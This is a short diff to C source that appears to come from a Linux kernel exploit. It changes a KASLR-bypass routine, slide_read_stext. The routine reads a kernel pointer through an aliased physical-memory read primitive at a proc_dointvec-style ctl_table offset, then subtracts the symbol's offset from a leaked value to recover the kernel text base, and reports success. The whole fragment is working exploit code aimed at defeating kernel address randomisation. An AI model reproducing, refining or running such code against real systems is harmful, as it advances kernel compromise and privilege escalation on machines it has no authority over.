@@ -526,7 +526,9 @@ uint64_t slide_read_stext(void) {
     return 0;
   }
 
-  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
+  uint64_t proc_handler_addr = SLIDE_PROC_DO_UUID_CTL_TABLE + 0x20;
+uint64_t proc_handler = *(volatile uint64_t *)(p0_data_alias(proc_handler_addr + slide_p0_offset));
+uint64_t off = p0_alias_image_offset(proc_handler);
   uint64_t stext = leaked - off;
   pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
              getpid(), (unsigned long long)leaked, (unsigned long long)stext);
